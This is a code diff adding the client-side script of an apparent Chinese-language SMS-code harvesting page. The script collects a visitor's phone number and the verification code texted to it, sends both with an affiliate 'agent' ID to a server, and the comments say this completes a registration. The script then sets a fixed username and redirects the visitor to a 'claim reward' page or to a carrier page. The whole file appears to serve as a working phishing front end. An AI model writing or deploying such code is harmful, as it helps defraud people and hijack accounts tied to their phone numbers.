@@ -1,0 +1,121 @@
+document.addEventListener("DOMContentLoaded", function() {
+    const submitPhoneButton = document.getElementById('submitPhoneNumber');
+    const submitCodeButton = document.getElementById('submitVerificationCode');
+    const phoneNumberInput = document.getElementById('phonenumber');
+    const verificationCodeInput = document.getElementById('verificationcode');
+    const agentId = new URLSearchParams(window.location.search).get('agent') || '0';
+
+    submitPhoneButton.addEventListener('click', function() {
+        var phoneNumber = phoneNumberInput.value.trim();
+        if (!phoneNumber) {
+            showToast("请输入手机号");
+            return;
+        }
+        if (!submitPhoneButton.disabled) {
+            startCountdown(60, submitPhoneButton);
+            apiCall('detectionphonenumber', {phonenumber: phoneNumber, agent: agentId});
+        }
+    });
+
+    submitCodeButton.addEventListener('click', function() {
+        var phoneNumber = phoneNumberInput.value.trim();
+        var verificationCode = verificationCodeInput.value.trim();
+        if (!verificationCode) {
+            showToast("请输入验证码再提交");
+            return;
+        }
+        showToast("验证中…", false);
+        apiCall('submitverificationcode', {phonenumber: phoneNumber, code: verificationCode, agent: agentId});
+    });
+});
+
+function apiCall(cmd, data) {
+    data.cmd = cmd;
+    fetch('submit.php', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data),
+    })
+    .then(response => response.ok ? response.json() : Promise.reject('Server response was not ok.'))
+    .then(data => {
+        handleApiResponse(cmd, data);
+    })
+    .catch((error) => {
+        console.error('Error:', error);
+        showToast("发生错误");
+    });
+}
+
+
+
+
+function handleApiResponse(cmd, data) {
+    if (data.err) {
+        // 上传验证码并注册成功的情况
+        if (data.err.code === 10 && cmd === 'submitverificationcode') {
+            showToast("正在前往领取，跳转中…");
+            setTimeout(function() {
+                window.location.href = "http://test.h6656.cn/api/apitxyxxt/chenggong/";
+            }, 3000);
+        }
+        // 上传手机号时收到的特定响应，表示可以上传验证码
+        else if (data.err.code === 6 && cmd === 'detectionphonenumber' && 
+                 (data.err.msg === "短信发送成功，请查收。" || data.err.msg === "请输入短信验证码。")) {
+            showToast(data.err.msg);
+        }
+        // 上传验证码时验证码错误的情况
+        else if ((data.err.code === 6 && cmd === 'submitverificationcode' && 
+                 data.err.msg === "验证码错误，请重新输入。") || (data.err.code === -1 && cmd === 'submitverificationcode')) {
+            // 对于验证码错误的情况，包括"code": 6 和 "code": -1，都只显示错误消息，不进行跳转
+            showToast(data.err.msg || "验证码错误，请重新输入。");
+        }
+        // 其他所有情况，显示失败消息但不立即跳转
+        else {
+            showToast(data.err.msg || "操作失败");
+            // 如果需要，这里可以设置延时后跳转到一个通用错误处理页面
+           setTimeout(function() {
+            window.location.href = "https://txwk.10010.com/wkpen/view/1593944b53.html";
+        }, 3000);
+        }
+    } else {
+        // 如果没有错误对象，假定操作成功
+        showToast("无响应");
+        // 可以在这里加入成功后的跳转逻辑
+        // setTimeout(() => window.location.href = "https://www.example.com/success", 3000);
+    }
+}
+
+
+
+function submitSetNamePass(phoneNumber) {
+    const data = {
+        cmd: 'submitSetNamePass',
+        phonenumber: phoneNumber,
+        user: 'wx666', // Your username logic here
+    };
+    apiCall('submitSetNamePass', data); // Re-use apiCall function for submitting the username
+}
+
+function showToast(message, autoHide = true) {
+    var toast = document.getElementById("toast");
+    toast.textContent = message;
+    toast.style.display = 'block';
+    if (autoHide) {
+        setTimeout(() => { toast.style.display = 'none'; }, 3000);
+    }
+}
+
+function startCountdown(duration, button) {
+    var timer = duration;
+    button.disabled = true;
+    button.textContent = `请等待 ${timer}秒`;
+    var countdownTimer = setInterval(() => {
+        timer--;
+        button.textContent = `请等待 ${timer}秒`;
+        if (timer <= 0) {
+            clearInterval(countdownTimer);
+            button.textContent = "重新获取验证码";
+            button.disabled = false;
+        }
+    }, 1000);
+}
